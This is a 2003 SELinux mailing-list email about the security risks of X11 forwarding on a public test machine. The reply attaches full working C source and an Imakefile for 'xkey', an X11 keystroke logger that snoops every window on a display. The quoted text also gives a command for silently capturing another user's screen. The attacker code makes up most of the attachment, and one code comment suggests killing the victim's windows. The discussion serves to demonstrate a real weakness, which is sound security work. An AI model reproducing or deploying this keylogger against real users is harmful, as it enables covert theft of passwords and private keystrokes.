Received: from jazzband.ncsc.mil (jazzband.ncsc.mil [144.51.5.4])
	by tycho.ncsc.mil (8.9.3/8.9.3) with ESMTP id NAA03096
	for <selinux@tycho.nsa.gov>; Mon, 3 Mar 2003 13:01:18 -0500 (EST)
Received: from jazzband.ncsc.mil (localhost [127.0.0.1])
	by jazzband.ncsc.mil  with ESMTP id h23I1GI02173
	for <selinux@tycho.nsa.gov>; Mon, 3 Mar 2003 18:01:16 GMT
Received: from hellcat.admin.navo.hpc.mil (hellcat.admin.navo.hpc.mil [204.222.179.34])
        by jazzband.ncsc.mil  with ESMTP id h23I1Ff02163 for <selinux@tycho.nsa.gov>; Mon, 3 Mar 2003 18:01:15 GMT
From: Jesse Pollard <pollard@admin.navo.hpc.mil>
To: Russell Coker <russell@coker.com.au>, SE Linux <selinux@tycho.nsa.gov>
Subject: Re: SE play machine
Date: Mon, 3 Mar 2003 12:00:45 -0600
References: <200303011851.31023.russell@coker.com.au>
In-Reply-To: <200303011851.31023.russell@coker.com.au>
MIME-Version: 1.0
Content-Type: Multipart/Mixed;
  boundary="------------Boundary-00=_91Q6I963T3TSGIDWJWSM"
Message-Id: <200303031200.45095.pollard@admin.navo.hpc.mil>
Sender: owner-selinux@tycho.nsa.gov
List-Id: selinux@tycho.nsa.gov


--------------Boundary-00=_91Q6I963T3TSGIDWJWSM
Content-Type: text/plain;
  charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

On Saturday 01 March 2003 11:51 am, Russell Coker wrote:
[snip]
> Also I have noticed a couple of people trying to run X sessions from th=
e
> play machine!  In one case the user didn't realise that their ssh clien=
t
> had a default configuration that permitted X tunneling, in another case=
 the
> user was deliberately trying to run an xterm on the box and tried sever=
al
> different ways of doing it.
>
> For reference, when you encounter someone who doesn't believe that X
> forwarding is a security issue then you can install imagemagick and run
> "import -window root file.jpg" to create a copy of what's on their scre=
en
> to show one part of the problem (the other part is reading the keyboard=
 -
> for which I have not found a conveniant demonstration program).

Again, only if you are sharing an account. Properly set up, X is relative=
ly
secure - The Xauthority file should only allow the user access, and the
ssh daemon/xauth should set a random key for access control forwarding.=20

Normally the X display is identified as host:10.0, and the -window root=20
options will fail as long as the logged in user does not have access to t=
he
Xauthority file. This, of course, failes if the idiot(err. loser... ummm =
user)
does an xhost+.

As far as a keyboard grabber: I've attached one that we used to use.

It may require some modification (I haven't used it since X11 R5) so
there may be some include file changes.

It is very simple, and not extremly well developed, but does capture
keystrokes from currently open windows.
--=20
-------------------------------------------------------------------------
Jesse I Pollard, II
Email: pollard@navo.hpc.mil

Any opinions expressed are solely my own.
--------------Boundary-00=_91Q6I963T3TSGIDWJWSM
Content-Type: text/plain;
  charset="iso-8859-1";
  name="Imakefile"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="Imakefile"

DEPLIBS = XawClientDepLibs
LOCAL_LIBRARIES = XawClientLibs

SRCS = xkey.c
OBJS = xkey.o

ComplexProgramTarget(xkey)

--------------Boundary-00=_91Q6I963T3TSGIDWJWSM
Content-Type: text/x-csrc;
  charset="iso-8859-1";
  name="xkey.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="xkey.c"

/* To compile, run it through your favorite ansi compiler something like 
 * this :
 *
 *    gcc -o xkey xkey.c -lX11 -lm
 *
 * To run it, just use it like this :  xkey displayname:0
 * and watch as that display's keypresses show up in your shell window.
 *
 *    Dominic Giampaolo (nick@cs.maxine.wpi.edu)
 */
#include <stdio.h>
#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Intrinsic.h>
#include <X11/StringDefs.h>
#include <X11/Xutil.h>
#include <X11/Shell.h>

char *TranslateKeyCode();
/*char *TranslateKeyCode(XEvent *ev);*/


Display *d;

void snoop_all_windows(root,type)
    Window root; unsigned long type;
{
  static int level = 0;
  Window parent, *children, *child2;
  unsigned int nchildren;
  int stat, i,j,k;

  level++;

  stat = XQueryTree(d, root, &root, &parent, &children, &nchildren);
  if (stat == FALSE)
   {
     fprintf(stderr, "Can't query window tree...\n");
     return;
   }

  if (nchildren == 0)
    return;

  /* For a more drastic inidication of the problem being exploited
   * here, you can change these calls to XSelectInput() to something
   * like XClearWindow(d, children[i]) or if you want to be real
   * nasty, do XKillWindow(d, children[i]).  Of course if you do that,
   * then you'll want to remove the loop in main(). 
   *
   * The whole point of this exercise being that I shouldn't be
   * allowed to manipulate resources which do not belong to me.
   */
  XSelectInput(d, root, type);

  for(i=0; i < nchildren; i++)
   {
     XSelectInput(d, children[i], type);
     snoop_all_windows(children[i], type);
   }     

  XFree((char *)children);
}


void main(argc,argv)
    int argc; char **argv;
{
  char *hostname;
  char *string;
  XEvent xev;
  int count = 0;
 
  if (argv[1] == NULL)
    hostname = ":0";
  else
    hostname = argv[1];
  
  d = XOpenDisplay(hostname);
  if (d == NULL)
   {
     fprintf(stderr, "Blah, can't open display: %s\n", hostname);
     exit(10);
   }

  snoop_all_windows(DefaultRootWindow(d), KeyPressMask);

  while(1)
   {
     XNextEvent(d, &xev);

     string = TranslateKeyCode(&xev);
     if (string == NULL)
       continue;

     if (*string == '\r')
       printf("\n");
     else if (strlen(string) == 1)
       printf("%s", string);
     else
       printf("<<%s>>", string);
     fflush(stdout);
   }
}


#define KEY_BUFF_SIZE 256
static char key_buff[KEY_BUFF_SIZE];

char *TranslateKeyCode(ev)
    XEvent *ev;
{
  int count;
  char *tmp;
  KeySym ks;

  if (ev)
   {
     count = XLookupString((XKeyEvent *)ev, key_buff, KEY_BUFF_SIZE, &ks,NULL);
     key_buff[count] = '\0';

     if (count == 0)
      {
        tmp = XKeysymToString(ks);
        if (tmp)
          strcpy(key_buff, tmp);
        else
          strcpy(key_buff, "");
      }

     return key_buff;
   }
  else
    return NULL;
}


--------------Boundary-00=_91Q6I963T3TSGIDWJWSM--

--
This message was distributed to subscribers of the selinux mailing list.
If you no longer wish to subscribe, send mail to majordomo@tycho.nsa.gov with
the words "unsubscribe selinux" without quotes as the message.
